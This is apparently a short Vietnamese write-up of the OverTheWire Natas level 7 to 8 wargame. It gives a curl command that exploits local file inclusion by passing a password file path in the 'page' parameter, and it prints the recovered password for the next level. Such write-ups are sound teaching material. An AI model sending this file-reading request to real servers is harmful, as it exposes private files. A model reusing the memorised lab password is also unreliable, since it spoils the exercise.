# Natas 7 → 8

## Mục tiêu

Đọc file qua LFI.

## Tôi thấy

Password xuất hiện trực tiếp trong response sau khi page trỏ tới `/etc/natas_webpass/natas8`.

## Cách làm

```bash
curl -u natas7:<password> "http://natas7.natas.labs.overthewire.org/?page=/etc/natas_webpass/natas8"
```

## Vì sao cách này hiệu quả

Ứng dụng đọc file theo input người dùng mà không validate path.

## Kết quả

Password của `natas8`:

```text
ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc
```
